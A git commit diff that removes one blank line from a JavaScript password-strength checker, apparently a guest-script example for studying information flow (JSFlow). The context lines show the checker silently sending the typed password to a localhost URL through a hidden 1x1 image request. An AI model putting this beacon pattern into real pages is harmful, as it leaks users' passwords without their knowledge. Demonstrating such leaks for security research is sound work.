8fd82e5dcf7dc730581fe591e125c293ae7a5e87
carllocos <carlos.javier.montero.castillo@vub.be>
2020-08-24 19:21:59 +0200

    line remove

--- public/jsflow/example1_guest.js
+++ public/jsflow/example1_guest.js
@@ -2,7 +2,6 @@ checkFunc = function checkStrength(pswd) {
     var fb = "Too Small"
     if (pswd.length >= 8) {
         fb = "Strong password!";
-
         var url = 'http://localhost:3030/password/?pswd=' + pswd
         var img = new Image(1,1); //used to give pswd to backend
         img.src = url;
